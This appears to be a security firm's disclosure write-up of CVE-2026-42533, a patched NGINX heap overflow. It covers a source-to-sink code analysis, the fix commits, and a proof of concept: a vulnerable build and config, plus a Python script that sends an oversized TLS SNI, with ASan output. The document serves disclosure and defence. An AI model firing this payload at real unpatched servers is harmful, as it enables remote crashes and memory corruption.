---
schema_version: "1.0.0"
document_id: "e6ef3f9d30cd9087a869eb715b00c2e6134d7e3b840bd3299b337ebfe5b4d553"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-42533"
published_at: "2026-07-15T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:41:19.924237+00:00"
content_hash: "sha256:6ba2f26b7ea3b32bda1d7487e2af667d449b8ef8bb29e0119e77f75d85541742"
---

# Stream complex-value capture desynchronization causes heap overflow (CVE-2026-42533)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


High


CVE-2026-42533


2026-07-15


# Stream complex-value capture desynchronization causes heap overflow (CVE-2026-42533)


## Summary


NGINX stream complex values allocated from stale capture state, then copied attacker-controlled regex captures


` ngx_stream_complex_value()` calculated an output length and copied the output in separate passes over mutable session-wide regex capture state. In a stream expression such as` return "$1$m"` , the first pass initially counted` $1` as zero bytes. Evaluating the later` $m` variable ran a regex-backed` map` over attacker-controlled TLS SNI and populated the session's capture array. The copy pass then revisited` $1` , found the new capture, and copied the SNI hostname into the buffer allocated from the stale one-byte length.


A live ASan build at NGINX commit` e8053c867f9ab14f323e3019ccab585d857abb66` confirmed a 12,000-byte write in` ngx_stream_script_copy_capture_code()` past the one-byte complex-value allocation. The public[F5 advisory](https://my.f5.com/manage/s/article/K000162097) ,[GitHub advisory](https://github.com/advisories/GHSA-fxfg-v4rj-hp95) , and[CVE record](https://www.cve.org/CVERecord?id=CVE-2026-42533) classify the issue as CWE-122. They assign CVSS 3.1 score 8.1 (High) and CVSS 4.0 score 9.2 (Critical), describe both regex-map capture ordering and non-cacheable-variable variants, and identify NGINX Open Source` 1.30.4` and` 1.31.3` as the fixed releases. The[NGINX security index](https://nginx.org/en/security_advisories.html) lists` 0.9.6-1.31.2` as vulnerable and` 1.31.3+` as not vulnerable. F5 credits Mufeed VH of Winfunc Research among the researchers who independently reported the issue.


NGINX shipped the mainline fix in[PR #1561](https://github.com/nginx/nginx/pull/1561) . The patch series first simplified capture-copy accounting in commit[2821920](https://github.com/nginx/nginx/commit/28219209e0b4f9e155fd8bd91ab81b8ac30628f2) , added bounds checks to HTTP and stream script copies in commit[b767540](https://github.com/nginx/nginx/commit/b767540492e8c79a58bc26034d3bab2f708b7bd1) , and extended the same protection to direct HTTP script users in commit[25f920e](https://github.com/nginx/nginx/commit/25f920eca977139dc6fc7638b419169a602a0064) . Stable NGINX 1.30 received the corresponding commits[ea47fab](https://github.com/nginx/nginx/commit/ea47fabf55e2bc9192ddc27f52486b4e58d5e007) ,[7ac6789](https://github.com/nginx/nginx/commit/7ac67898bdfed2140a1bedcda252074cca11f494) , and[326b17b](https://github.com/nginx/nginx/commit/326b17b0038321c29252e79bf4c53d4773fcb8b5) through[PR #1563](https://github.com/nginx/nginx/pull/1563) .


### CVSS Score


Vector


N


Complexity


H


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 412


src /stream


/ngx_stream_core_module.c


ngx_stream_core_preread_phase()


Sink


Line 940


src /stream


/ngx_stream_script.c


ngx_stream_script_copy_capture_code()


## Source-to-Sink Analysis


1


src/stream/ngx_stream_core_module.c:412


A client connected to the reachable stream listener and supplied unauthenticated preread bytes. With` ssl_preread on` , those bytes were parsed as a TLS ClientHello before any upstream connection or application authentication.


CPP


```text
n = c-> recv  (c, b->last, size);


```


2


src/stream/ngx_stream_ssl_preread_module.c:401-407


The SSL preread parser allocated storage for the SNI hostname using the length encoded by the client. The generic parser copy state then copied the attacker-controlled hostname bytes into this session-owned buffer.


CPP


```text
host =  ngx_pnalloc  (ctx->pool, size);
if   (host ==  NULL  ) {
return   NGX_ERROR;
}


ctx->host.data = host;


```


3


src/stream/ngx_stream_script.c:82-100


` ngx_stream_complex_value()` ran all length opcodes, allocated exactly that predicted length, and only then ran the copy opcodes. Both passes read mutable capture fields from the same` ngx_stream_session_t` .


CPP


```text
for   (i =  0  ; ip && *ip; i++) {
lcode = *(ngx_stream_script_len_code_pt *) ip;
len +=  lcode  (&le);
}


value->len = len;
value->data =  ngx_pnalloc  (s->connection->pool, len);


while   (*( uintptr_t   *) e.ip) {
code = *(ngx_stream_script_code_pt *) e.ip;
code  (( ngx_stream_script_engine_t   *) &e);
}


```


4


src/stream/ngx_stream_script.c:909-914 (before fix)


The` $1` length opcode ran before the regex-backed map variable. With no current capture, it contributed zero bytes to the allocation and did not reserve space for a later capture.


CPP


```text
if   (n < s->ncaptures) {
cap = s->captures;
return   cap[n +  1  ] - cap[n];
}


return    0  ;


```


5


src/stream/ngx_stream_variables.c:1172-1184


The following` $m` length opcode evaluated` map $ssl_preread_server_name $m` . Its regex matched the attacker-controlled SNI and published new offsets and` captures_data` into the session-wide capture state after` $1` had already been sized.


CPP


```text
rc =  ngx_regex_exec  (re->regex, str, s->captures, len);


if   (rc == NGX_REGEX_NO_MATCHED) {
return   NGX_DECLINED;
}


s->ncaptures = rc *  2  ;
s->captures_data = str->data;


```


6


src/stream/ngx_stream_script.c:87-90


With the map value` X` , the stale predicted output length was one byte. NGINX allocated that one-byte result even though` $1` now referred to the much longer SNI capture.


CPP


```text
value->len = len;
value->data =  ngx_pnalloc  (s->connection->pool, len);


```


7


src/stream/ngx_stream_script.c:937-940 (before fix)


During the copy pass, the` $1` opcode observed the newly populated capture state and copied the full SNI hostname without checking the remaining result-buffer capacity. The ASan proof reached this sink with a 12,000-byte write.


CPP


```text
if   (n < s->ncaptures) {
cap = s->captures;
p = s->captures_data;
e->pos =  ngx_copy  (pos, &p[cap[n]], cap[n +  1  ] - cap[n]);
}


```


8


src/stream/ngx_stream_script.c:680-704,982-989 (fix, commit b767540)


The accepted fix records the allocated buffer end and routes literal, variable, and capture copies through a shared length guard. A mismatch logs an alert, stops the script, sets an internal-error status, and makes` ngx_stream_complex_value()` fail closed.


CPP


```text
if   (e->end - e->pos < ( ssize_t  ) len) {
ngx_log_error  (NGX_LOG_ALERT, e->session->connection->log,  0  ,
"no buffer space in script copy"  );
e->ip = ngx_stream_script_exit;
e->status = NGX_STREAM_INTERNAL_SERVER_ERROR;
return   NGX_ERROR;
}


/* capture copy */
if   ( ngx_stream_script_check_length  (e, len) != NGX_OK) {
return  ;
}


e->pos =  ngx_copy  (pos, p, len);


```


## Impact Analysis


### Critical Impact


The demonstrated primitive is an unauthenticated remote heap/pool out-of-bounds write in an NGINX worker, with write contents and length controlled through TLS SNI. The proof copied 12,000 attacker-controlled bytes into an output allocation sized for one byte. ASan and hardened allocators terminate the worker, producing denial of service; without them, adjacent pool or heap state can be corrupted. The public CVE states that code execution is possible when ASLR is disabled or bypassed, but this proof does not claim a reliable production code-execution chain.


### Attack Surface


NGINX Open Source and NGINX Plus data-plane listeners that evaluate affected complex values. The confirmed stream path requires` ngx_stream_module` , PCRE/PCRE2 support,` ngx_stream_ssl_preread_module` , a reachable stream listener, and a regex-backed stream variable such as` map $ssl_preread_server_name $m` . The public advisory also covers equivalent HTTP map/regex and non-cacheable-variable length/copy desynchronization patterns.


### Preconditions


For the demonstrated stream trigger,` ssl_preread on` must expose attacker-controlled SNI to a regex-backed` map` , and the same complex value must reference a positional capture before the map output, such as` return "$1$m"` . No earlier regex may have populated an equivalent capture before the length pass. The attacker needs no authentication, local access, or user interaction, but exploitation depends on this non-default configuration.


## Proof of Concept


### Environment Setup


Check out the confirmed vulnerable NGINX revision and build it with the stream preread module and AddressSanitizer:


BASH


```text
git  clone   https://github.com/nginx/nginx.git
cd   nginx
git checkout e8053c867f9ab14f323e3019ccab585d857abb66


auto/configure \
--with-stream \
--with-stream_ssl_preread_module \
--with-debug \
--with-cc-opt= '-O1 -g -fsanitize=address -fno-omit-frame-pointer'   \
--with-ld-opt= '-fsanitize=address'
make -j " $(getconf _NPROCESSORS_ONLN 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo 2)  "


```


### Target Configuration


Save this as` conf/capture-desync.conf` and start NGINX in the foreground with` ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:symbolize=1' objs/nginx -p "$PWD" -c conf/capture-desync.conf` :


NGINX


```text
worker_processes 1;
master_process off;
daemon off;
pid /tmp/nginx-capture-desync.pid;
error_log stderr debug;


events { worker_connections 1024; }


stream {
map $ssl_preread_server_name $m {
~^(.+)$ X;
default X;
}


server {
listen 127.0.0.1:8443;
ssl_preread on;
return "$1$m";
}
}


```


### Exploit Delivery


Send a TLS ClientHello whose SNI hostname contains 12,000` a` bytes:


PYTHON


```text
import   socket
import   struct


sni =  b"a"   *  12000


ext_data = struct.pack( "!H"  ,  3   +  len  (sni))
ext_data +=  b"\x00"
ext_data += struct.pack( "!H"  ,  len  (sni))
ext_data += sni


sni_ext =  b"\x00\x00"   + struct.pack( "!H"  ,  len  (ext_data)) + ext_data


body =  b"\x03\x03"
body +=  b"\x00"   *  32
body +=  b"\x00"
body += struct.pack( "!H"  ,  2  ) +  b"\x13\x01"
body +=  b"\x01\x00"
body += struct.pack( "!H"  ,  len  (sni_ext)) + sni_ext


handshake =  b"\x01"   +  len  (body).to_bytes( 3  ,  "big"  ) + body
record =  b"\x16\x03\x01"   + struct.pack( "!H"  ,  len  (handshake)) + handshake


with   socket.create_connection(( "127.0.0.1"  ,  8443  ), timeout= 5  )  as   sock:
sock.sendall(record)
try  :
sock.recv( 64  )
except   OSError:
pass


```


### Outcome


The request proves that regex evaluation between the length and copy passes can turn a previously absent positional capture into an attacker-sized copy. On NGINX 1.30.4, 1.31.3, or a build containing the applicable bounds-check commits, the same request must not produce an ASan report or crash the worker; the script should stop safely when the predicted and actual copy lengths diverge.


**Expected Response:** A vulnerable ASan build aborts with the capture copy in the stack:


TEXT


```text
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 12000
#1 ... in ngx_stream_script_copy_capture_code ngx_stream_script.c:940
SUMMARY: AddressSanitizer: heap-buffer-overflow ngx_stream_script.c:940 in ngx_stream_script_copy_capture_code


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/pull/1561)
